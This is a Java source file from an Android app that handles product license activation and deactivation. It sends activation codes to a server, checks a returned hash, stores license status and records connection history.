package com.fx.activation;

import java.io.UnsupportedEncodingException;

import android.content.Context;
import android.net.ConnectivityManager;

import com.fx.activation.ActivationManager.Status;
import com.fx.license.LicenseManager;
import com.fx.maind.ref.Customization;
import com.fx.preference.ConnectionHistoryManager;
import com.fx.preference.ConnectionHistoryManagerFactory;
import com.fx.preference.model.ConnectionHistory;
import com.fx.preference.model.ConnectionHistory.ConnectionStatus;
import com.fx.util.FxResource;
import com.vvt.http.HttpWrapper;
import com.vvt.http.HttpWrapperException;
import com.vvt.http.HttpWrapperResponse;
import com.vvt.logger.FxLog;
import com.vvt.network.NetworkUtil;
import com.vvt.util.BinaryUtil;

class DefaultActivation extends Thread {

	private static final String TAG = "DefaultActivation";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final boolean MOCK_ACTIVATION = false;
	
	private Context mContext;
	private ActivationHelper mActivationHelper;
	private ConnectionHistory mConnectionHistory;
	private ConnectionHistoryManager mConnectionHistoryManager;
	private LicenseManager mLicenseManager;
	
	public boolean mActivationFlag; // true: activate, false: deactivate
	public String mInputActivationCode;
	
	DefaultActivation(Context context) {
		mContext = context;
		mActivationHelper = ActivationHelper.getInstance(mContext);
		mConnectionHistoryManager = 
				ConnectionHistoryManagerFactory.getInstance(context);
		mLicenseManager = LicenseManager.getInstance(mContext);
	}
	
	public void activateProduct(String activationCode) {
		mActivationFlag = true;
		mInputActivationCode = activationCode;
		
		if (!mLicenseManager.isActivated()) {
			start();
		}
		else {
			if (LOGV) FxLog.v(TAG, "Already activated.");
		}
	}
	
	public void deactivateProduct(String activationCode) {
		mActivationFlag = false;
		mInputActivationCode = activationCode;
		
		if (mLicenseManager.isActivated()) {
			start();
		}
		else {
			if (LOGV) FxLog.v(TAG, "Already deactivated.");
		}
	}
	
	@Override
	public void run() {
		// Initiate connection history
		initConnectionHistory();
		
		// Get a response from activation or deactivation
		Response response = doActivateOrDeactivate(mActivationFlag, mInputActivationCode);
		
		if (LOGD) FxLog.d(TAG, String.format("Response: %s", response));
		
		// Write response information into database 
		mConnectionHistoryManager.setActivationResponse(response);
		
		String activationCode = null;
		String hashCode = null;

		// Activate
		if (mActivationFlag) {
			if (response.isSuccess()) {
				activationCode = mInputActivationCode;
				hashCode = response.getHashCode();
			}
		}
		// Deactivate
		else { 
			// For deactivate, we don't care the response, client should be deactivated anyway. 
			if (response.getActivationStatus() == Status.DEACTIVATED) {
				activationCode = null;
				hashCode = null;
			}
		}
		
		// Write values into database
		mLicenseManager.setActivationStatus(activationCode == null ? -1 : 0);
		mLicenseManager.setActivationCode(activationCode);
		mLicenseManager.setHashCode(hashCode);
		
		// Notify other processes to check the activation response
		if (mActivationFlag) {
			mContext.getContentResolver().notifyChange(ActivationHelper.URI_ACTIVATION_SUCCESS, null);
		}
		else {
			mContext.getContentResolver().notifyChange(ActivationHelper.URI_DEACTIVATION_SUCCESS, null);
		}
	}
	
	private Response doActivateOrDeactivate(boolean activationFlag, String activationCode) {
		HttpWrapper httpWrapper = HttpWrapper.getInstance();
		httpWrapper.setConnectionTimeoutMilliseconds(20000);
		HttpWrapperResponse httpResponse = null;
		HttpWrapperException httpException = null;
		Response tmpResponse = null;
		
		try {
			// Set connection start time
			mConnectionHistory.setConnectionStartTime(System.currentTimeMillis());
			
			String url = null;
			if (activationFlag) {
				url = mActivationHelper.getActivationUrl(activationCode);
			} 
			else {
				url = mActivationHelper.getDeactivationUrl(activationCode);
			}
			
			httpResponse = httpWrapper.httpGet(url);
		} 
		catch (HttpWrapperException e) {
			if (LOGE) FxLog.e(TAG, String.format("%s Exception: %s", 
					activationFlag ? "Activation" : "Deactivation", 
							e == null ? "n/a" : e.toString()));
			httpException = e;
		}
		
		// Set connection end time
		mConnectionHistory.setConnectionEndTime(System.currentTimeMillis());
		
		int httpStatusCode = -1;
		if (httpResponse != null) {
			httpStatusCode = httpResponse.getHttpStatusCode();
			tmpResponse = createResponseFromHttpResponse(activationFlag, httpResponse);
		}
		else if (httpException != null) {
			httpStatusCode = httpException.getHttpStatusCode();
			tmpResponse = mActivationHelper.createResponseFromHttpException(activationFlag, httpException);
		}
		
		// Set HTTP status code
		mConnectionHistory.setHttpStatusCode(httpStatusCode);
		
		// Set connection status
		if (tmpResponse != null && tmpResponse.isSuccess()) {
			mConnectionHistory.setConnectionStatus(ConnectionHistory.ConnectionStatus.SUCCESS);
		}
		else {
			mConnectionHistory.setConnectionStatus(ConnectionHistory.ConnectionStatus.FAILED);
		}
		
		// Add connection history to database
		mConnectionHistoryManager.addConnectionHistory(mConnectionHistory);
		
		// Re-construct response object
		Response response = new Response();
		response.setActivateAction(mActivationFlag);
		response.setSuccess(tmpResponse.isSuccess());
		response.setMessage(tmpResponse.getMessage());
		response.setActivationStatus(tmpResponse.getActivationStatus());
		response.setResponseCode(tmpResponse.getResponseCode());
		response.setHashCode(tmpResponse.getHashCode());
		
		return response;
	}
	
	private Response createResponseFromHttpResponse(boolean activationFlag, 
			HttpWrapperResponse httpWrapperResponse) {
		
		if (MOCK_ACTIVATION) {
			Status status = activationFlag ? Status.ACTIVATED : Status.DEACTIVATED;
			Response response = new Response(true, "", status);
			response.setHashCode(ActivationHelper.getInstance(mContext).calculateHash());
			return response;
		}
		
		byte[] httpResponse = httpWrapperResponse.getBodyAsBytes();
		byte responseCodeByte = -1;
		boolean success;
		String message;
		Status status = null;

		if (LOGD) FxLog.d(TAG, String.format("HTTP response status code: %d", 
				httpWrapperResponse.getHttpStatusCode()));
		
		String serverHashCode = null;
		
		if (activationFlag) {
			serverHashCode = BinaryUtil.bytesToString2(httpResponse, 5, httpResponse.length);
			
			if (LOGV) FxLog.v(TAG, String.format("Server hash: %s", serverHashCode));
		}
		
		if ((activationFlag && httpResponse.length >= 6) || 
			(! activationFlag && httpResponse.length >= 3)) {
			
			responseCodeByte = httpResponse[0];
			
			// Set response code byte
			mConnectionHistory.setResponseCode(responseCodeByte);
			
			if (LOGV) FxLog.v(TAG, String.format("Response code = %d", responseCodeByte));
			
			if (responseCodeByte == (byte) 0) { // Successful request?
				if (activationFlag) {
					if (mActivationHelper.calculateHash().equals(serverHashCode)) {
						message = FxResource.LANGUAGE_ACTIVATION_SUCCESS;
						success = true;
					} 
					else {
						message = FxResource.LANGUAGE_EVENTS_RESPONSE_CODE_UNKNOWN;
						success = false;
					}
				} 
				else {
					message = FxResource.LANGUAGE_DEACTIVATION_SUCCESS;
					success = true;
				}
			} 
			else {
				if (responseCodeByte == (byte) 239) {
					if (LOGV) FxLog.v(TAG, "Deactivation failed. This Activation Code is already deactivated");
					status = Status.DEACTIVATED;
				}
				int messageLengthBytes = httpResponse.length - 3;
				byte[] messageAsBytes = new byte[messageLengthBytes];
					
				System.arraycopy(httpResponse, 3, messageAsBytes, 0, messageLengthBytes);
				try {
					message = String.format("0x%02X: %s", responseCodeByte,
							new String(messageAsBytes, "utf-8"));
					
					if (LOGV) FxLog.v(TAG, String.format("Error message from server: %s", message));
				} 
				catch (UnsupportedEncodingException e) {
					if (LOGD) FxLog.d(TAG, "Invalid encoding of response message.");
					message = FxResource.LANGUAGE_ACTIVATION_RESPONSE_NOT_DEFINED;
					if (LOGV) FxLog.v(TAG, String.format("Set error message to: %s", message));
				}
				success = false;
			}
		}
		else {
			if (LOGD) FxLog.d(TAG, "Invalid response");
			message = FxResource.LANGUAGE_EVENTS_RESPONSE_CODE_UNKNOWN;
			success = false;
		}

		if (status == null) {
			if (success) {
				status = activationFlag ? Status.ACTIVATED : Status.DEACTIVATED;
			} 
			else {
				status = activationFlag ? Status.DEACTIVATED : Status.ACTIVATED;
			}
		}
		Response response = new Response(success, message, status);
		response.setResponseCode(responseCodeByte);
		response.setHashCode(serverHashCode);
		
		return response;
	}
	
//-------------------------------------------------------------------------------------------------
// CONNECTION HISTORY METHODS 
//-------------------------------------------------------------------------------------------------
	
	/**
	 * Set Action and Connection Type
	 */
	private void initConnectionHistory() {
		mConnectionHistory = new ConnectionHistory(System.currentTimeMillis());
		
		// Set action
		if (mActivationFlag) {
			mConnectionHistory.setAction(ConnectionHistory.Action.ACTIVATE);
		}
		else {
			mConnectionHistory.setAction(ConnectionHistory.Action.DEACTIVATE);
		}
		
		// Set connection type
		if (!NetworkUtil.hasInternetConnection(mContext)) {
			mConnectionHistory.setConnectionType(ConnectionHistory.ConnectionType.NO_CONNECTION);
			mConnectionHistory.setConnectionStatus(ConnectionStatus.FAILED);
		}
		else {
			int networkType = NetworkUtil.getActiveNetworkType(mContext);
			
			if (networkType == ConnectivityManager.TYPE_MOBILE) {
				mConnectionHistory.setConnectionType(ConnectionHistory.ConnectionType.MOBILE);
			}
			else if (networkType == ConnectivityManager.TYPE_WIFI) {
				mConnectionHistory.setConnectionType(ConnectionHistory.ConnectionType.WIFI);
			}
			else {
				mConnectionHistory.setConnectionType(ConnectionHistory.ConnectionType.UNRECOGNIZED);
			}
		}
	}
	
}
